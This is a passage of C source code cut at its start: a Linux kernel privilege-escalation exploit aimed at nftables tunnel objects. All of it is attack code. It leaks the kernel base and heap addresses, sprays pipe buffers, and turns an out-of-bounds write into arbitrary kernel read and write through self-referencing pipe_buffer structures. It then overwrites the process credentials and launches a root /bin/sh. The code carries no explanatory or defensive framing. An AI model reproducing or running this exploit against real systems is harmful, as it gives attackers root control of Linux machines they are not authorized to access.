	attr_size += MNL_ALIGN(OBJ_TABLE->nla_len);

	// NFTA_OBJ_TYPE
    struct nlattr* OBJ_TYPE = (struct nlattr*)&nlh_GET_OBJ.payload[attr_size];
	OBJ_TYPE->nla_len = 8;
	OBJ_TYPE->nla_type = NFTA_OBJ_TYPE | 0x4000;
    int obj_type = htobe32(NFT_OBJECT_TUNNEL);
    memcpy(&nlh_GET_OBJ.payload[attr_size + sizeof(struct nlattr)], &obj_type, sizeof(obj_type));
	attr_size += MNL_ALIGN(OBJ_TYPE->nla_len);

	// NFTA_OBJ_NAME
	struct nlattr* OBJ_NAME = (struct nlattr*)&nlh_GET_OBJ.payload[attr_size];
	OBJ_NAME->nla_len = 0xC;
	OBJ_NAME->nla_type = NFTA_OBJ_NAME;
	char obj_name[8];
	memset(obj_name, 0, sizeof(obj_name));
	snprintf(obj_name, 8, "obj%d", idx);
	memcpy(&nlh_GET_OBJ.payload[attr_size + sizeof(struct nlattr)], obj_name, strlen(obj_name) + 1);
	attr_size += MNL_ALIGN(OBJ_NAME->nla_len);

	nlh_GET_OBJ.nlmsg_len = 0x14 + attr_size;

	uint8_t payload[0x1000];
	int payload_size = 0;
	memcpy(&payload[payload_size], &nlh_batch_start, sizeof(nlh_batch_start));
	payload_size += MNL_ALIGN(nlh_batch_start.nlmsg_len);
	memcpy(&payload[payload_size], &nlh_GET_OBJ, nlh_GET_OBJ.nlmsg_len);
	payload_size += MNL_ALIGN(nlh_GET_OBJ.nlmsg_len);
	memcpy(&payload[payload_size], &nlh_batch_end, sizeof(nlh_batch_end));
	payload_size += MNL_ALIGN(nlh_batch_end.nlmsg_len);

	iov.iov_base = payload;
	iov.iov_len = payload_size;
	sendmsg(fd, &msg, 0);
}

#define TRY_PAGE_UAF_TIMES 1
#define SPRAY_PIPE_NFT 0xa0
#define SPRAY_PIPE_UAF 0x180 
#define FIRST_SPRAY_PIPE_NUM 0x300
#define SPRAY_PIPE_NUM 0x580
/* for pipe escalation */
#define SND_PIPE_BUF_SZ 96
#define TRD_PIPE_BUF_SZ 192
#define VMEMMAP_BASE 0xffffea0000000000

size_t overflow_data[2];
int fail_times = 0;
int overflow_pipe_stop_idx = 0;
size_t cred, real_cred;
int origin_idx = 0;
int victim_idx = 0;
size_t struct_page_pointer = 0;
int recv_oob_read_idx = 0;
bool leak_pipe_ops = 0;
bool leak_nft_list = 0;
size_t kernel_offset = -1;
int mark_add[SPRAY_PIPE_NFT+1] = {0};
size_t nft_obj1_addr = 0, nft_obj2_addr = 0;
size_t pipe_buffer_ops = 0xffffffff832623c0;
size_t kernel_base = 0xffffffff81000000;

int self_2nd_pipe_pid = -1, self_3rd_pipe_pid = -1, self_4th_pipe_pid = -1;
bool show_obj(int idx, bool leak_pipe, bool leak_nft, bool leak_page){
	char recv_buf[0x3000] = {0};
	struct iovec iov;
	struct msghdr msg = {
	    .msg_name = NULL,
	    .msg_namelen = 0,
	    .msg_iov = &iov,
	    .msg_iovlen = 1,
	    .msg_control = NULL,
	    .msg_controllen = 0,
	    .msg_flags = 0,
	};

	struct nlhead nlh_GET_OBJ = {
	    .nlmsg_type = (NFNL_SUBSYS_NFTABLES << 8) | NFT_MSG_GETOBJ,
	    .nlmsg_flags = NLM_F_REQUEST,
	    .nlmsg_seq = 0,
	    .nlmsg_pid = 0,
	    .nfgen_family = NFPROTO_NETDEV,
	    .version = 0,
	    .res_id = htobe16(NFNL_SUBSYS_NFTABLES),
	};

	int attr_size = 0;
	// NFTA_OBJ_TABLE
	struct nlattr* OBJ_TABLE = (struct nlattr*)&nlh_GET_OBJ.payload[attr_size];
	OBJ_TABLE->nla_len = 9;
	OBJ_TABLE->nla_type = NFTA_OBJ_TABLE;
    memcpy(&nlh_GET_OBJ.payload[attr_size + sizeof(struct nlattr)], "tab0\000", 5);
	attr_size += MNL_ALIGN(OBJ_TABLE->nla_len);

	// NFTA_OBJ_TYPE
    struct nlattr* OBJ_TYPE = (struct nlattr*)&nlh_GET_OBJ.payload[attr_size];
	OBJ_TYPE->nla_len = 8;
	OBJ_TYPE->nla_type = NFTA_OBJ_TYPE | 0x4000;
    int obj_type = htobe32(NFT_OBJECT_TUNNEL);
    memcpy(&nlh_GET_OBJ.payload[attr_size + sizeof(struct nlattr)], &obj_type, sizeof(obj_type));
	attr_size += MNL_ALIGN(OBJ_TYPE->nla_len);

	// NFTA_OBJ_NAME
	struct nlattr* OBJ_NAME = (struct nlattr*)&nlh_GET_OBJ.payload[attr_size];
	OBJ_NAME->nla_len = 0xC;
	OBJ_NAME->nla_type = NFTA_OBJ_NAME;
	char obj_name[8];
	memset(obj_name, 0, sizeof(obj_name));
	snprintf(obj_name, 8, "obj%d", idx);
	memcpy(&nlh_GET_OBJ.payload[attr_size + sizeof(struct nlattr)], obj_name, strlen(obj_name) + 1);
	attr_size += MNL_ALIGN(OBJ_NAME->nla_len);

	nlh_GET_OBJ.nlmsg_len = 0x14 + attr_size;
	iov.iov_base = &nlh_GET_OBJ;
	iov.iov_len = nlh_GET_OBJ.nlmsg_len;
	sendmsg(fd, &msg, 0);

	// size_t buf_size = 0x3000;
    // uint8_t* recv_buf = malloc(buf_size);
    memset(recv_buf,0 ,sizeof(recv_buf));
    int len = recv(fd, recv_buf, sizeof(recv_buf), 0);

	uint32_t *value = (uint32_t *)recv_buf;
	if (leak_pipe) {
		for (int i = 0; i < len/4; i++) {
			// if ((value[i] & 0xfff) == (uint32_t)(pipe_buffer_ops & 0xfff) && value[i-1] == 0x4){	//0x4 == write data len in pipe_buffer
			if (value[i-1] == 0x4 && value[i-2] == 0 
				&& value[i-3] >= 0xffff0000 && value[i-3] < 0xffffff00){	//0x4 == write data len in pipe_buffer
				// print_binary(recv_buf, len);
				printf("[*] You get pipe_buffer_ops!\n");
				printf("value[%d] == 0x%x\n", i, value[i]);
				// struct_page_pointer = (size_t)value[i-3] << 32;
				// struct_page_pointer += ((value[i-4] & 0xff)/4-1) << 24;
				// struct_page_pointer += value[i-5] << 16;
				// struct_page_pointer += value[i-7]; 		 //low_2_bytes
				// printf("struct_page_pointer == %p\n", (void *)struct_page_pointer);
				recv_oob_read_idx = i - 3;
				pipe_buffer_ops = 0xffffffff00000000 + value[i]; 
				kernel_offset = pipe_buffer_ops - 0xffffffff832623c0; //pipe_buffer_ops
				kernel_base += kernel_offset;
				leak_pipe_ops = 1;
				return true;
			}
		}
	}	

	if (leak_nft) {
		if (value[recv_oob_read_idx] >= 0xffff0000 && value[recv_oob_read_idx] <= 0xffffff00 
					&& value[recv_oob_read_idx+2] >= 0xffff0000 && value[recv_oob_read_idx+2] <= 0xfffff000 
					&& value[recv_oob_read_idx+1]%0x200 == 0 && value[recv_oob_read_idx+3]%2 == 1){	//for example list_head->prev = 0xffff8881036f4a00;
			
			print_binary(recv_buf, len);
			printf("[*] You get nft_obj addr!\n");
			printf("[-] value[%d] == 0x%x\n", recv_oob_read_idx+3, value[recv_oob_read_idx+3]);
			nft_obj1_addr = (size_t)value[recv_oob_read_idx+2] << 32;
			nft_obj1_addr += value[recv_oob_read_idx+1];
			nft_obj2_addr = nft_obj1_addr + 0x200;
			leak_nft_list = 1;
			return true;
		}
	}

	if (leak_page) {
		// printf("[-] Read large data in page...\n");
		if (len < 0xD00) return false;
		// print_binary(recv_buf, len);
		size_t *comm = memmem(recv_buf, len, (void *)&pipe_buffer_ops, 8);
		if (!comm) {
			if (mark_add[idx] == 0) {
				mark_add[idx] == 1;
				overflow_data[1] += 0xD00; //Read next area to search pipe_buffer
				printf("[*] Try to find next 0xD00 area to search pipe_buffer\n");
			}
			return false;
		}
		printf("[*] You get pipe_buffer struct page pointer\n");
		print_binary(&comm[-2], 0x80);
		struct_page_pointer = comm[-2];
		printf("struct_page_pointer == %p\n", (void *)struct_page_pointer);
		return true;
	}
	// free(recv_buf);
	return false;
}

#include <sys/resource.h>
void set_file_limit(rlim_t soft_limit, rlim_t hard_limit) {
    struct rlimit rl;
    rl.rlim_cur = soft_limit;
    rl.rlim_max = hard_limit;
    if (setrlimit(RLIMIT_NOFILE, &rl) != 0) {
        err_exit("setrlimit failed");
    }
    printf("[*] Success set file desc limit: soft=%lu, hard=%lu\n", rl.rlim_cur, rl.rlim_max);
}


size_t vmemmap_base = 0xffffea0000000000;
size_t page_offset_base = 0xffff888000000000;
int cmd_pipe_spray_cred[2];
int spray_pipe[SPRAY_PIPE_NUM][2];
struct pipe_buffer info_pipe_buf;
struct pipe_buffer evil_pipe_buf;

size_t direct_map_addr_to_page_addr(size_t direct_map_addr)
{
    size_t page_count;

    page_count = ((direct_map_addr & (~0xfff)) - page_offset_base) / 0x1000;
    
    return vmemmap_base + page_count * 0x40;
}
void arbitrary_read_by_pipe(size_t target_addr, int len, char *buffer) {
	char data[0x1000] = {0};
	size_t page = direct_map_addr_to_page_addr(target_addr);
	// Set second pipe_buffer 
	evil_pipe_buf.page = (struct page*)page;
	evil_pipe_buf.offset = target_addr & 0xfff;
	evil_pipe_buf.len = 0x1ff8;
	write(spray_pipe[self_4th_pipe_pid][1], &evil_pipe_buf, sizeof(struct pipe_buffer));
	write(spray_pipe[self_4th_pipe_pid][1], data, SND_PIPE_BUF_SZ-sizeof(struct pipe_buffer)); 

	// Set third pipe_buffer point --> 4th pipe_buffer
	evil_pipe_buf.page = (struct page*)struct_page_pointer;
	evil_pipe_buf.offset = 0x120 + TRY_PAGE_UAF_TIMES*0x60;
	evil_pipe_buf.len = 0;
	write(spray_pipe[self_4th_pipe_pid][1], &evil_pipe_buf, sizeof(struct pipe_buffer));
	write(spray_pipe[self_4th_pipe_pid][1], data, SND_PIPE_BUF_SZ-sizeof(struct pipe_buffer)); 

	// Set 4th pipe_buffer point --> 2nd pipe_buffer
	evil_pipe_buf.page = (struct page*)struct_page_pointer;
	evil_pipe_buf.offset = 0x60 + TRY_PAGE_UAF_TIMES*0x60;
	evil_pipe_buf.len = 0;
	write(spray_pipe[self_3rd_pipe_pid][1], &evil_pipe_buf, sizeof(struct pipe_buffer));
	write(spray_pipe[self_3rd_pipe_pid][1], data, SND_PIPE_BUF_SZ-sizeof(struct pipe_buffer)); 

	read(spray_pipe[self_2nd_pipe_pid][0], buffer, len);
}

void arbitrary_write_by_pipe(size_t target_addr, int len, char *buffer) {
	char data[0x1000] = {0};
	size_t page = direct_map_addr_to_page_addr(target_addr);
	// Set second pipe_buffer 
	evil_pipe_buf.page = (struct page*)page;
	evil_pipe_buf.offset = target_addr & 0xfff;
	evil_pipe_buf.len = 0;
	write(spray_pipe[self_4th_pipe_pid][1], &evil_pipe_buf, sizeof(struct pipe_buffer));
	write(spray_pipe[self_4th_pipe_pid][1], data, SND_PIPE_BUF_SZ-sizeof(struct pipe_buffer)); 

	// Set third pipe_buffer point --> 4th pipe_buffer
	evil_pipe_buf.page = (struct page*)struct_page_pointer;
	evil_pipe_buf.offset = 0x120 + TRY_PAGE_UAF_TIMES*0x60;
	evil_pipe_buf.len = 0;
	write(spray_pipe[self_4th_pipe_pid][1], &evil_pipe_buf, sizeof(struct pipe_buffer));
	write(spray_pipe[self_4th_pipe_pid][1], data, SND_PIPE_BUF_SZ-sizeof(struct pipe_buffer)); 

	// Set 4th pipe_buffer point --> 2nd pipe_buffer
	evil_pipe_buf.page = (struct page*)struct_page_pointer;
	evil_pipe_buf.offset = 0x60 + TRY_PAGE_UAF_TIMES*0x60;
	evil_pipe_buf.len = 0;
	write(spray_pipe[self_3rd_pipe_pid][1], &evil_pipe_buf, sizeof(struct pipe_buffer));
	write(spray_pipe[self_3rd_pipe_pid][1], data, SND_PIPE_BUF_SZ-sizeof(struct pipe_buffer)); 

	write(spray_pipe[self_2nd_pipe_pid][1], buffer, len);
}

#define SPRAY_CHILD_NUM 0x60
pid_t processes[SPRAY_CHILD_NUM];
#define __ID__ "try2findmehenry"
int spawn_root_shell()
{
    for (int i = 0; i < SPRAY_CHILD_NUM; i++)
    {
        kill(processes[i], SIGCONT);
    }
    while(wait(NULL) > 0);

    return 0;
}
int spawn_processes()
{
    for (int i = 0; i < SPRAY_CHILD_NUM; i++)
    {
        pid_t child = fork();
        if (child == 0) {
			char a;
			read(cmd_pipe_spray_cred[0], &a, 1);
			// printf("fork child %d\n", i);
            if (prctl(PR_SET_NAME, __ID__, 0, 0, 0) != 0) {
                perror("Could not set name");
            }
            uid_t old = getuid();
            kill(getpid(), SIGSTOP);
            uid_t uid = getuid();
            if (uid == 0) {
                system("/bin/sh");
            }
            exit(uid);
        }
        if (child < 0) {
            return child;
        }
        processes[i] = child;
    }
    return 0;
}

int trigger(){
    char buf[0x1000] = {0};
	bind_core(1);
	if (pipe(cmd_pipe_spray_cred) < 0)
		perror("pipe");
	
	spawn_processes();

	bind_core(0);
	set_file_limit(262144, 262144);

	// set env	
	setup();
	fd = socket(AF_NETLINK, SOCK_RAW, NETLINK_NETFILTER);
	alloc_table(0);
	alloc_table(1);

	// STEP.1 Leak kernel_base & kernel_offset
	uint8_t payload[4];
	memset(payload, 0x61, 4);
	printf("pipe_buffer_ops == %x\n", (uint32_t)(pipe_buffer_ops & 0xffffffff));	

	for(int i=0; i<0x100; i++){
		if (pipe(spray_pipe[0]) < 0)
		{
			perror("pipe");
		}
		alloc_leak_obj(0, 0);		//alloc nft_obj 1
		if (fcntl(spray_pipe[0][1], F_SETPIPE_SZ, 0x1000 * 8) < 0) { //alloc pipe_buffer
			perror("Fail to F_SETPIPE_SZ\n");
		}

		write(spray_pipe[0][1], payload, sizeof(payload));
		
		if (show_obj(0, 1, 0, 0)) {
			free_obj(0);
			close(spray_pipe[0][0]);
			close(spray_pipe[0][1]);
			break;
		};

		free_obj(0);
		close(spray_pipe[0][0]);
		close(spray_pipe[0][1]);
	}

	if (!leak_pipe_ops) 
		err_exit("Fail to leak pipe_buffer_ops, try again!");

	printf("kernel_base == %p\n", (void *)kernel_base);	
	printf("kernel_offset == %p\n", (void *)kernel_offset);	
	printf("pipe_buffer_ops == %p\n", (void *)pipe_buffer_ops);	
	
	// init pipe_buffer
	for (int i = 0; i < SPRAY_PIPE_NUM; i++) {
        if (pipe(spray_pipe[i]) < 0) {
			perror("pipe");
        }

		if (i >= SPRAY_PIPE_NFT+SPRAY_PIPE_UAF) {
			if (fcntl(spray_pipe[i][1], F_SETPIPE_SZ, 0x1000 * 8) < 0) { //alloc pipe_buffer
				perror("Fail to F_SETPIPE_SZ\n");
			}	
			write(spray_pipe[i][1], "bsd_crow", 8);
			write(spray_pipe[i][1], "bsd_crow", 8);
			write(spray_pipe[i][1], "bsd_crow", 8);
		}
    }

	// clean kmalloc-cg-256
	for (int i=0; i < 0x400; i++) {
		alloc_leak_obj(1, i);
	}

	// STEP.2 Leak heap addr by nft_list
	for (int i=0; i < 0x500; i++) {
		alloc_leak_obj(0, 0);
		alloc_leak_obj(0, 1);
		if (show_obj(0, 0, 1, 0) || show_obj(1, 0, 1, 0)) {
			// printf("count i == %d\n", i);
			break;
		};
		free_obj(0);
		free_obj(1);
	}

	if (!leak_nft_list) 
		err_exit("Fail to leak nft_list(i.e heap addr), try again!");
	printf("nft_obj1_addr == %p\n", (void *)nft_obj1_addr);
	printf("nft_obj2_addr == %p\n", (void *)nft_obj2_addr);	


	// STEP.3 Release obj_0 && spray pipe_buffer to occupy it 
    // init pipe_buffer
	printf("[*] Release obj_0 && spray pipe_buffer to occupy it\n");
    free_obj(0);
    free_obj(1);
    for (int i = 0; i < SPRAY_PIPE_NFT; i++) {
        if (fcntl(spray_pipe[i][1], F_SETPIPE_SZ, 0x1000 * 8) < 0) { //alloc pipe_buffer
			perror("Fail to F_SETPIPE_SZ\n");
		}
		// memcpy(buf, "bsdhenry", 8);
        *(int *)&buf[0] = i;
		// write(spray_pipe[i][1], buf, 0x300);
		write(spray_pipe[i][1], buf, SND_PIPE_BUF_SZ*(TRY_PAGE_UAF_TIMES+1));
    }

	// construct gap to prevent step.4 OOB write pipe_buffer in step.3
	for (int i=0x400; i < 0x480; i++) {
		alloc_leak_obj(1, i);
	}


    // STEP.4 OOB write nft_obj udata & udlen to read struct page
	printf("[*] OOB write nft_obj udata & udlen to read struct page\n");
	overflow_data[0] = 0xD00;		  //udlen
	overflow_data[1] = nft_obj1_addr; //udata
	for (int i = 0; i < SPRAY_PIPE_NFT; i += 2) {
		// alloc_leak_obj(i);
        alloc_obj_with_overflow(0, i, 1, 0x10, (uint8_t *)overflow_data, 0x10); // overflow_size + 0x40
        alloc_obj_with_overflow(0, i+1, 1, 0x10, (uint8_t *)overflow_data, 0x10); // overflow_size + 0x40
		for (int j = 0; j <= i; j += 2) {
			if (i > 8 && j < i - 8) continue;
			if (show_obj(j, 0, 0, 1) || show_obj(j+1, 0, 0, 1)) break;
		}
		// printf("Are you ok? i == %d\n", i);
		if(struct_page_pointer) break;
	}

	if (!struct_page_pointer) err_exit("Fail to leak struct page pointer, try again!\n");

	// construct gap to prevent step.4 OOB write pipe_buffer in step.3
	for (int i=0x480; i < 0x500; i++) {
		alloc_leak_obj(1, i);
	}

	char data[0x300] = {0};
	size_t page_ptr;
	for (int count = 0; count < TRY_PAGE_UAF_TIMES+1; count++) {
		// STEP.5 OOB write pipe_buffer to construct page uaf
		printf("[*] OOB write pipe_buffer to construct page uaf\n");
		int idx;
		for (int i = SPRAY_PIPE_NFT+1+overflow_pipe_stop_idx; i < SPRAY_PIPE_NFT+SPRAY_PIPE_UAF; i++) {
			memset(buf, 0, SPRAY_PIPE_UAF*4);
			for (int k = 0; k < SPRAY_PIPE_UAF; k++){
				*(int *)&buf[k*4] = i;	//identify every pipe
			}
			if (fcntl(spray_pipe[i][1], F_SETPIPE_SZ, 0x1000 * 8) < 0) { //alloc pipe_buffer
				perror("Fail to F_SETPIPE_SZ\n");
			}
			write(spray_pipe[i][1], buf, SPRAY_PIPE_UAF*4);
			alloc_obj_with_overflow(0, i, 1, 4, (uint8_t *)&struct_page_pointer, 0);

			for (int j = SPRAY_PIPE_NFT+1+overflow_pipe_stop_idx; j <= i; j++){
				read(spray_pipe[j][0], &idx, 4);
				if ((uint32_t)idx > SPRAY_PIPE_NFT) continue;
				if (idx != j) {
					printf("[*] Success to change pipe_buffer struct page pointer\n");
					origin_idx = idx;
					victim_idx = j;
					printf("origin_idx == %d\n", origin_idx);
					printf("victim_idx == %d\n", j);
					break;
				}
			}
			if (origin_idx || victim_idx) {
				overflow_pipe_stop_idx = i + 1;
				break; 
			}
		}
		printf("overflow_pipe_stop_idx == %d\n", overflow_pipe_stop_idx);

		if (!origin_idx && !victim_idx) err_exit("Fail to find uaf pipe. try again\n");

		// STEP.6 Release redundant pipe_buffer and prepare to construct second level pipe
		printf("[*] Release redundant pipe_buffer and prepare to construct second level pipe\n");
		// construct uaf page
		printf("fail times == %d\n", fail_times);
		close(spray_pipe[victim_idx][0]);
		close(spray_pipe[victim_idx][1]);
		size_t snd_pipe_sz = 0x1000 * (SND_PIPE_BUF_SZ/sizeof(struct pipe_buffer));
		if (!fail_times) {
			for (int i = SPRAY_PIPE_NFT+SPRAY_PIPE_UAF; i < FIRST_SPRAY_PIPE_NUM; i++) {
				if (fcntl(spray_pipe[i][1], F_SETPIPE_SZ, snd_pipe_sz) < 0) { //alloc pipe_buffer
					perror("Fail to F_SETPIPE_SZ\n"); 
				}
			}
		}
		else {
			for (int i = FIRST_SPRAY_PIPE_NUM+((SPRAY_PIPE_NUM-FIRST_SPRAY_PIPE_NUM)/(TRY_PAGE_UAF_TIMES)*(fail_times-1)); 
					i < FIRST_SPRAY_PIPE_NUM+((SPRAY_PIPE_NUM-FIRST_SPRAY_PIPE_NUM)/(TRY_PAGE_UAF_TIMES)*fail_times); i++) {
				if (fcntl(spray_pipe[i][1], F_SETPIPE_SZ, snd_pipe_sz) < 0) { //alloc pipe_buffer
					perror("Fail to F_SETPIPE_SZ\n"); 
				}
			}
		}
		//===============================================================
		// memset(data, 0x300, 0);
		// int len = read(spray_pipe[origin_idx][0], data, 0x300);
		// printf("read data length = 0x%x\n", len);
		// print_binary(data, len);
		//===============================================================
		// pause();

		// STEP.7 Building_self_writing_pipe
		read(spray_pipe[origin_idx][0], &info_pipe_buf, sizeof(struct pipe_buffer));
		read(spray_pipe[origin_idx][0], data, SND_PIPE_BUF_SZ-sizeof(struct pipe_buffer));
		print_binary(&info_pipe_buf, sizeof(struct pipe_buffer));
		if (info_pipe_buf.page) break;
		printf("[+] Construct page uaf failed, try again..\n");
		printf("count == %d\n", count);
		sleep(1);
		origin_idx = 0;
		victim_idx = 0;
		fail_times++;
		struct_page_pointer += 0x40;
	}
	if (!origin_idx && !victim_idx) err_exit("Fail to find uaf pipe. So pity!\n");

    puts("[*] hijacking the 2nd pipe_buffer on page to itself...");
	memset(data, 0, 0x300);
    evil_pipe_buf.page = (struct page *)struct_page_pointer;
    evil_pipe_buf.offset = 0x60 + 0x60*TRY_PAGE_UAF_TIMES;           // point to third pipe_buffer in page
    evil_pipe_buf.len = 0x60;				
    evil_pipe_buf.ops = info_pipe_buf.ops;
    evil_pipe_buf.flags = info_pipe_buf.flags;
    evil_pipe_buf.private = info_pipe_buf.private;
	print_binary(&evil_pipe_buf, sizeof(struct pipe_buffer));

	write(spray_pipe[origin_idx][1], &evil_pipe_buf, sizeof(struct pipe_buffer));
	write(spray_pipe[origin_idx][1], data, SND_PIPE_BUF_SZ-sizeof(struct pipe_buffer)); //padding
	for (int i = (!fail_times) ? 
								(SPRAY_PIPE_NFT+SPRAY_PIPE_UAF) 
								: (FIRST_SPRAY_PIPE_NUM+((SPRAY_PIPE_NUM-FIRST_SPRAY_PIPE_NUM)/(TRY_PAGE_UAF_TIMES)*(fail_times-1)));
			i < (!fail_times) ? 
								(FIRST_SPRAY_PIPE_NUM) 
								: (FIRST_SPRAY_PIPE_NUM+((SPRAY_PIPE_NUM-FIRST_SPRAY_PIPE_NUM)/(TRY_PAGE_UAF_TIMES)*fail_times)); i++) {
		read(spray_pipe[i][0], &page_ptr, 8);
		// printf("page_ptr[%d] == %p\n", i, (void *)page_ptr);
		if (page_ptr == struct_page_pointer) {
			// print_binary(buf, 0x60);
			self_2nd_pipe_pid = i;		
			printf("[+] Found second-self-writing pipe: %d\n", self_2nd_pipe_pid);
			break;
		}
	}
	if (self_2nd_pipe_pid == -1) err_exit("Fail to find self_2nd_pipe_pid");

	printf("[*] Build third-self-writing pipe...\n");
	write(spray_pipe[origin_idx][1], &evil_pipe_buf, sizeof(struct pipe_buffer));
	write(spray_pipe[origin_idx][1], data, SND_PIPE_BUF_SZ-sizeof(struct pipe_buffer)); //padding
	for (int i = (!fail_times) ? 
								(SPRAY_PIPE_NFT+SPRAY_PIPE_UAF) 
								: (FIRST_SPRAY_PIPE_NUM+((SPRAY_PIPE_NUM-FIRST_SPRAY_PIPE_NUM)/(TRY_PAGE_UAF_TIMES)*(fail_times-1)));
			i < (!fail_times) ? 
								(FIRST_SPRAY_PIPE_NUM) 
								: (FIRST_SPRAY_PIPE_NUM+((SPRAY_PIPE_NUM-FIRST_SPRAY_PIPE_NUM)/(TRY_PAGE_UAF_TIMES)*fail_times)); i++) {
		if (i == self_2nd_pipe_pid) continue;
		read(spray_pipe[i][0], &page_ptr, 8);
		if (page_ptr == struct_page_pointer) {
			self_3rd_pipe_pid = i;
			printf("[+] Found third-self-writing pipe: %d\n", self_3rd_pipe_pid);
			break;
		}
	}

	if (self_3rd_pipe_pid == -1) err_exit("Fail to find self_3rd_pipe_pid");

	printf("[*] Build 4th-self-writing pipe...\n");
	write(spray_pipe[origin_idx][1], &evil_pipe_buf, sizeof(struct pipe_buffer));
	write(spray_pipe[origin_idx][1], data, SND_PIPE_BUF_SZ-sizeof(struct pipe_buffer)); //padding
	for (int i = (!fail_times) ? 
								(SPRAY_PIPE_NFT+SPRAY_PIPE_UAF) 
								: (FIRST_SPRAY_PIPE_NUM+((SPRAY_PIPE_NUM-FIRST_SPRAY_PIPE_NUM)/(TRY_PAGE_UAF_TIMES)*(fail_times-1)));
			i < (!fail_times) ? 
								(FIRST_SPRAY_PIPE_NUM) 
								: (FIRST_SPRAY_PIPE_NUM+((SPRAY_PIPE_NUM-FIRST_SPRAY_PIPE_NUM)/(TRY_PAGE_UAF_TIMES)*fail_times)); i++) {
		if (i == self_2nd_pipe_pid || i == self_3rd_pipe_pid) continue;
		read(spray_pipe[i][0], &page_ptr, 8);
		if (page_ptr == struct_page_pointer) {
			self_4th_pipe_pid = i;
			printf("[+] Found 4th-self-writing pipe: %d\n", self_4th_pipe_pid);
			break;
		}
	}
	if (self_4th_pipe_pid == -1) err_exit("Fail to find self_4th_pipe_pid");

	//modify 3rd_pipe_buffer --> 4th pipe_buffer 
	evil_pipe_buf.offset = 0x120 + TRY_PAGE_UAF_TIMES*0x60; //-->4th pipe_buffer
	evil_pipe_buf.len = 0;	//write start from 4th pipe_buffer
	write(spray_pipe[self_4th_pipe_pid][1], &evil_pipe_buf, sizeof(struct pipe_buffer));	//write start from third pipe_buffer
	write(spray_pipe[self_4th_pipe_pid][1], data, SND_PIPE_BUF_SZ-sizeof(struct pipe_buffer)); //padding

	//modify 4th_pipe_buffer --> 2nd_pipe_buffer
	evil_pipe_buf.offset = 0x60 + TRY_PAGE_UAF_TIMES*0x60; //-->2nd pipe_buffer
	evil_pipe_buf.len = 0;	//write start from 2nd pipe_buffer
	write(spray_pipe[self_3rd_pipe_pid][1], &evil_pipe_buf, sizeof(struct pipe_buffer));	//write start from third pipe_buffer
	write(spray_pipe[self_3rd_pipe_pid][1], data, SND_PIPE_BUF_SZ-sizeof(struct pipe_buffer)); //padding	
	

	// STEP.8 AAR & AAW
	printf("[*] Scanning memory to search task struct....\n");
	int i = 0;
	size_t addr = nft_obj1_addr & ~0xfff;
	// correct page_offset_base & vmemmap_base in kaslr
	page_offset_base = (nft_obj1_addr & 0xfffffffff0000000) - 0x100000000;
	vmemmap_base = struct_page_pointer & 0xfffffffff0000000;
	write(cmd_pipe_spray_cred[1], data, SPRAY_CHILD_NUM); //spray cred struct
	while (1) {
		memset(buf, 0, 0x1000);
		arbitrary_read_by_pipe(addr + i*0x1000, 0xfff, buf); //must promise len < 0x1000
		size_t *comm_addr = memmem(buf, 0x1000, __ID__, 0xf);
		// printf("[-] search addr = %p\n", (void *)(addr + i*0x1000));
		// print_binary(buf, 0x20);
		if (comm_addr && (comm_addr[-2] > 0xffff000000000000) /* task->cred 0xffffff800339ff00*/ 
            && (comm_addr[-3] > 0xffff000000000000)) {
			printf("[*] Yeah you find me henry!\n");
			cred = comm_addr[-2];
			real_cred = comm_addr[-3];
			printf("[+] cred == %p\n", (void *)cred);
			printf("[+] real_cred == %p\n", (void *)real_cred);

			memset(buf, 0, 0x1000);
			arbitrary_write_by_pipe(real_cred+8, 0x10, buf);
			spawn_root_shell();
			break;
		}
		i++;
	}

	sleep(100000);
}

int main(void)
{

	while (1) {
		if (!trigger()) continue;
	}
	return 0;
}
